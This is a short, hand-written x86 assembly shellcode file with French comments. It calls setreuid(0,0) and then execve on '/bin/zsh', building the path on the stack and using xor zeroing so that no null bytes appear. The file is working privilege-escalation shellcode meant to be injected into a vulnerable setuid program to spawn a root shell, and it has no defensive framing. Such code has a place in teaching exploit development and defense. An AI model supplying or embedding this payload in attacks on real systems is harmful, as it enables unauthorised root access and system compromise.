; shellcode hand-made
section .text
    global _start

_start:
; setreuid(0, 0)
    xor eax, eax
    mov al, 0x46	; numero syscall setreuid()
    xor ebx, ebx	; ruid = 0
    xor ecx, ecx	; euid = 0
    int 0x80

; execve("/bin/zsh", NULL, NULL)
    xor eax, eax
    mov al, 0x0b	; numero syscall execve()
    xor edx, edx
    push edx
    push 0x68737a2f     ; "hsz/"
    push 0x6e69622f     ; "nib/"
    mov ebx, esp
    xor ecx, ecx
    int 0x80
